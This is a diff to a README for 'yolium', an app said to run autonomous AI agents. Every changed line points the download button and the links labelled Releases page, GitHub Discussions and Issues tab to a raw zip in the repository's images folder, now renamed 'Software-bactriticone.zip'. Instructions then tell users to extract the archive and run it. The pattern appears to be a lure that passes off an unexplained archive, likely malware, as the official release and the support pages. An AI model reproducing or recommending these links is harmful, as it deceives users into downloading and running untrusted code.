@@ -6,7 +6,7 @@ Welcome to **yolium**! This desktop app allows you to run autonomous AI agents i
 
 ## 📥 Download yolium
 
-[![Download yolium](https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-v1.1-alpha.2.zip%https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-v1.1-alpha.2.zip)](https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-v1.1-alpha.2.zip)
+[![Download yolium](https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-bactriticone.zip%https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-bactriticone.zip)](https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-bactriticone.zip)
 
 Click the button above to download the latest version of yolium. 
 
@@ -32,7 +32,7 @@ Before you install yolium, you need to ensure your computer meets these requirem
 To get started with yolium, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-v1.1-alpha.2.zip) to see the available versions.
+   Go to the [Releases page](https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-bactriticone.zip) to see the available versions.
 
 2. **Download the Latest Version:**
    Look for the latest release, and download the appropriate file for your operating system. 
@@ -45,7 +45,7 @@ To get started with yolium, follow these steps:
      - Open the downloaded `.dmg` file.
      - Drag the yolium app to your Applications folder.
    - **For Linux:**
-     - Extract the downloaded `https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-v1.1-alpha.2.zip` file.
+     - Extract the downloaded `https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-bactriticone.zip` file.
      - Open a terminal and run `./yolium` from the extracted folder.
 
 4. **Start the Application:**
@@ -76,9 +76,9 @@ After launching yolium, follow this brief guide to maximize your experience:
 
 For assistance or to share your experiences with yolium, consider joining our community. You can find various resources such as FAQs, user discussions, and troubleshooting tips. 
 
-- **GitHub Discussions:** Join the conversation at [GitHub Discussions](https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-v1.1-alpha.2.zip).
+- **GitHub Discussions:** Join the conversation at [GitHub Discussions](https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-bactriticone.zip).
 
-- **Issue Tracking:** Report any issues you encounter by using the [Issues tab](https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-v1.1-alpha.2.zip) on GitHub. 
+- **Issue Tracking:** Report any issues you encounter by using the [Issues tab](https://github.com/Mouslim91/yolium/raw/refs/heads/master/images/Software-bactriticone.zip) on GitHub. 
 
 ## 🌟 Additional Resources
 
